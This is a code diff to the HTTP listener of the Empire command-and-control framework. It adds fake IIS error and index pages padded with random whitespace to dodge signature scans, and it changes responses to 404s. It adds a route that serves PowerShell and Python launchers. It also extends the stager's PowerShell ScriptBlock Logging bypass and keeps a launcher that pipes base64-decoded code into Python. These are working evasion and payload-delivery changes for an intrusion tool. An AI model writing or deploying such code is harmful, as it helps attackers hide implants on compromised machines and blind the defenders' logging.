@@ -1,5 +1,6 @@
 import logging
 import base64
+import sys
 import random
 import os
 import ssl
@@ -7,13 +8,15 @@ import time
 import copy
 import sys
 from pydispatch import dispatcher
-from flask import Flask, request, make_response
+from flask import Flask, request, make_response, send_from_directory
 # Empire imports
 from lib.common import helpers
 from lib.common import agents
 from lib.common import encryption
 from lib.common import packets
 from lib.common import messages
+from lib.common import templating
+from lib.common import obfuscation
 
 
 class Listener:
@@ -150,17 +153,86 @@ class Listener:
         # set the default staging key to the controller db default
         self.options['StagingKey']['Value'] = str(helpers.get_config('staging_key')[0])
 
+        # randomize the length of the default_response and index_page headers to evade signature based scans
+        self.header_offset = random.randint(0, 64)
 
     def default_response(self):
         """
+        Returns an IIS 7.5 404 not found page.
+        """
+
+        return '\n'.join([
+            '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">',
+            '<html xmlns="http://www.w3.org/1999/xhtml">',
+            '<head>',
+            '<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>',
+            '<title>404 - File or directory not found.</title>',
+            '<style type="text/css">',
+            '<!--',
+            'body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}',
+            'fieldset{padding:0 15px 10px 15px;}',
+            'h1{font-size:2.4em;margin:0;color:#FFF;}',
+            'h2{font-size:1.7em;margin:0;color:#CC0000;}',
+            'h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;}',
+            '#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;',
+            'background-color:#555555;}',
+            '#content{margin:0 0 0 2%;position:relative;}',
+            '.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}',
+            '-->',
+            '</style>',
+            '</head>',
+            '<body>',
+            '<div id="header"><h1>Server Error</h1></div>',
+            '<div id="content">',
+            ' <div class="content-container"><fieldset>',
+            '  <h2>404 - File or directory not found.</h2>',
+            '  <h3>The resource you are looking for might have been removed, had its name changed, or is temporarily unavailable.</h3>',
+            ' </fieldset></div>',
+            '</div>',
+            '</body>',
+            '</html>',
+            ' ' * self.header_offset,  # randomize the length of the header to evade signature based detection
+        ])
+
+    def index_page(self):
+        """
         Returns a default HTTP server page.
         """
-        page = "<html><body><h1>It works!</h1>"
-        page += "<p>This is the default web page for this server.</p>"
-        page += "<p>The web server software is running but no content has been added, yet.</p>"
-        page += "</body></html>"
-        return page
 
+        return '\n'.join([
+            '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">',
+            '<html xmlns="http://www.w3.org/1999/xhtml">',
+            '<head>',
+            '<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />',
+            '<title>IIS7</title>',
+            '<style type="text/css">',
+            '<!--',
+            'body {',
+            '    color:#000000;',
+            '    background-color:#B3B3B3;',
+            '    margin:0;',
+            '}',
+            '',
+            '#container {',
+            '    margin-left:auto;',
+            '    margin-right:auto;',
+            '    text-align:center;',
+            '    }',
+            '',
+            'a img {',
+            '    border:none;',
+            '}',
+            '',
+            '-->',
+            '</style>',
+            '</head>',
+            '<body>',
+            '<div id="container">',
+            '<a href="http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409"><img src="welcome.png" alt="IIS7" width="571" height="411" /></a>',
+            '</div>',
+            '</body>',
+            '</html>',
+        ])
 
     def validate_options(self):
         """
@@ -205,16 +277,23 @@ class Listener:
                     stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
 
                     # ScriptBlock Logging bypass
-                    stager += helpers.randomize_capitalization("$GPS=[ref].Assembly.GetType(")
+                    stager += helpers.randomize_capitalization("$GPF=[ref].Assembly.GetType(")
                     stager += "'System.Management.Automation.Utils'"
                     stager += helpers.randomize_capitalization(").\"GetFie`ld\"(")
                     stager += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
-                    stager += helpers.randomize_capitalization(").GetValue($null);If($GPS")
+                    stager += helpers.randomize_capitalization(");If($GPF){$GPC=$GPF.GetValue($null);If($GPC")
                     stager += "['ScriptB'+'lockLogging']"
-                    stager += helpers.randomize_capitalization("){$GPS")
+                    stager += helpers.randomize_capitalization("){$GPC")
                     stager += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
-                    stager += helpers.randomize_capitalization("$GPS")
+                    stager += helpers.randomize_capitalization("$GPC")
                     stager += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
+                    stager += helpers.randomize_capitalization("$val=[Collections.Generic.Dictionary[string,System.Object]]::new();$val.Add")
+                    stager += "('EnableScriptB'+'lockLogging',0);"
+                    stager += helpers.randomize_capitalization("$val.Add")
+                    stager += "('EnableScriptBlockInvocationLogging',0);"
+                    stager += helpers.randomize_capitalization("$GPC")
+                    stager += "['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']"
+                    stager += helpers.randomize_capitalization("=$val}")
                     stager += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
                     stager += "'signatures','N'+'onPublic,Static'"
                     stager += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
@@ -250,19 +329,23 @@ class Listener:
                             stager += helpers.randomize_capitalization("$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;")
                         else:
                             # TODO: implement form for other proxy
-                            stager += helpers.randomize_capitalization("$proxy=New-Object Net.WebProxy;")
-                            stager += helpers.randomize_capitalization("$proxy.Address = '"+ proxy.lower() +"';")
+                            stager += helpers.randomize_capitalization("$proxy=New-Object Net.WebProxy('"+ proxy.lower() +"');")
                             stager += helpers.randomize_capitalization("$wc.Proxy = $proxy;")
-                        if proxyCreds.lower() == "default":
-                            stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
-                        else:
-                            # TODO: implement form for other proxy credentials
-                            username = proxyCreds.split(':')[0]
-                            password = proxyCreds.split(':')[1]
-                            domain = username.split('\\')[0]
-                            usr = username.split('\\')[1]
-                            stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"','"+domain+"');"
-                            stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = $netcred;")
+                        if proxyCreds.lower() != 'none':
+                            if proxyCreds.lower() == "default":
+                                stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
+                            else:
+                                # TODO: implement form for other proxy credentials
+                                username = proxyCreds.split(':')[0]
+                                password = proxyCreds.split(':')[1]
+                                if len(username.split('\\')) > 1:
+                                    usr = username.split('\\')[1]
+                                    domain = username.split('\\')[0]
+                                    stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"','"+domain+"');"
+                                else:
+                                    usr = username.split('\\')[0]
+                                    stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"');"
+                                stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = $netcred;")
 
                         #save the proxy settings to use during the entire staging process and the agent
                         stager += "$Script:Proxy = $wc.Proxy;"
@@ -418,7 +501,7 @@ class Listener:
 
                 if encode:
                     launchEncoded = base64.b64encode(launcherBase)
-                    launcher = "echo \"import sys,base64,warnings;warnings.filterwarnings(\'ignore\');exec(base64.b64decode('%s'));\" | python &" % (launchEncoded)
+                    launcher = "echo \"import sys,base64,warnings;warnings.filterwarnings(\'ignore\');exec(base64.b64decode('%s'));\" | /usr/bin/python &" % (launchEncoded)
                     return launcher
                 else:
                     return launcherBase
@@ -508,29 +591,23 @@ class Listener:
                 return randomizedStager
 
         elif language.lower() == 'python':
-            # read in the stager base
-            f = open("%s/data/agent/stagers/http.py" % (self.mainMenu.installPath))
-            stager = f.read()
-            f.close()
+            template_path = os.path.join(self.mainMenu.installPath, 'data/agent/stagers')
+            eng = templating.TemplateEngine(template_path)
+            template = eng.get_template('http.py')
 
-            stager = helpers.strip_python_comments(stager)
+            template_options = {
+                    'working_hours': workingHours,
+                    'kill_date': killDate,
+                    'staging_key': stagingKey,
+                    'profile': profile,
+                    'stage_1': stage1,
+                    'stage_2': stage2
+                    }
 
-            if host.endswith("/"):
-                host = host[0:-1]
+            stager = template.render(template_options)
+            stager = obfuscation.py_minify(stager)
 
-            if workingHours != "":
-                stager = stager.replace('SET_WORKINGHOURS', workingHours)
-
-            if killDate != "":
-                stager = stager.replace('SET_KILLDATE', killDate)
-
-            # # patch the server and key information
-            stager = stager.replace("REPLACE_STAGING_KEY", stagingKey)
-            stager = stager.replace("REPLACE_PROFILE", profile)
-            stager = stager.replace("index.jsp", stage1)
-            stager = stager.replace("index.php", stage2)
-
-            # # base64 encode the stager and return it
+            # base64 encode the stager and return it
             if encode:
                 return base64.b64encode(stager)
             if encrypt:
@@ -767,7 +844,7 @@ def send_message(packets=None):
         #if signaled for restaging, exit.
         if HTTPError.code == 401:
             sys.exit(0)
-        
+
         return (HTTPError.code, '')
 
     except urllib2.URLError as URLerror:
@@ -813,11 +890,15 @@ def send_message(packets=None):
 
         @app.route('/download/<stager>')
         def send_stager(stager):
-            if stager:
+            if 'po' in stager:
                 launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=False, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
                 return launcher
+            elif 'py' in stager:
+                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='python', encode=False, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+                return launcher
             else:
-                pass
+                return make_response(self.default_response(), 404)
+        
         @app.before_request
         def check_ip():
             """
@@ -825,7 +906,7 @@ def send_message(packets=None):
             """
             if not self.mainMenu.agents.is_ip_allowed(request.remote_addr):
                 dispatcher.send("[!] %s on the blacklist/not on the whitelist requested resource" % (request.remote_addr), sender="listeners/http")
-                return make_response(self.default_response(), 200)
+                return make_response(self.default_response(), 404)
 
 
         @app.after_request
@@ -842,6 +923,25 @@ def send_message(packets=None):
             response.headers['Pragma'] = "no-cache"
             response.headers['Expires'] = "0"
             return response
+
+        @app.route('/')
+        @app.route('/index.html')
+        def serve_index():
+            """
+            Return default server web page if user navigates to index.
+            """
+            
+            static_dir = self.mainMenu.installPath + "data/misc/"
+            return make_response(self.index_page(), 200)
+
+        @app.route('/welcome.png')
+        def serve_index_helper():
+            """
+            Serves image loaded by index page.
+            """
+
+            static_dir = self.mainMenu.installPath + "data/misc/"
+            return send_from_directory(static_dir, 'welcome.png')
 
 
         @app.route('/<path:request_uri>', methods=['GET'])
@@ -895,7 +995,7 @@ def send_message(packets=None):
                                     print helpers.color("[*] Orphaned agent from %s, signaling restaging" % (clientIP))
                                     return make_response(self.default_response(), 401)
                                 else:
-                                    return make_response(self.default_response(), 200)
+                                    return make_response(self.default_response(), 404)
 
                             else:
                                 # actual taskings
@@ -903,14 +1003,13 @@ def send_message(packets=None):
                                 return make_response(results, 200)
                         else:
                             # dispatcher.send("[!] Results are None...", sender='listeners/http')
-                            return make_response(self.default_response(), 200)
+                            return make_response(self.default_response(), 404)
                 else:
-                    return make_response(self.default_response(), 200)
+                    return make_response(self.default_response(), 404)
 
             else:
                 dispatcher.send("[!] %s requested by %s with no routing packet." % (request_uri, clientIP), sender='listeners/http')
-                return make_response(self.default_response(), 200)
-
+                return make_response(self.default_response(), 404)
 
         @app.route('/<path:request_uri>', methods=['POST'])
         def handle_post(request_uri):
@@ -955,16 +1054,16 @@ def send_message(packets=None):
 
                         elif results[:10].lower().startswith('error') or results[:10].lower().startswith('exception'):
                             dispatcher.send("[!] Error returned for results by %s : %s" %(clientIP, results), sender='listeners/http')
-                            return make_response(self.default_response(), 200)
+                            return make_response(self.default_response(), 404)
                         elif results == 'VALID':
                             dispatcher.send("[*] Valid results return by %s" % (clientIP), sender='listeners/http')
-                            return make_response(self.default_response(), 200)
+                            return make_response(self.default_response(), 404)
                         else:
                             return make_response(results, 200)
                     else:
-                        return make_response(self.default_response(), 200)
+                        return make_response(self.default_response(), 404)
             else:
-                return make_response(self.default_response(), 200)
+                return make_response(self.default_response(), 404)
 
         try:
             certPath = listenerOptions['CertPath']['Value']
@@ -974,6 +1073,7 @@ def send_message(packets=None):
                 pyversion = sys.version_info
 
                 # support any version of tls
+                pyversion = sys.version_info
                 if pyversion[0] == 2 and pyversion[1] == 7 and pyversion[2] >= 13:
                     proto = ssl.PROTOCOL_TLS
                 elif pyversion[0] >= 3:
@@ -990,7 +1090,6 @@ def send_message(packets=None):
         except Exception as e:
             print helpers.color("[!] Listener startup on port %s failed: %s " % (port, e))
             dispatcher.send("[!] Listener startup on port %s failed: %s " % (port, e), sender='listeners/http')
-
 
     def start(self, name=''):
         """
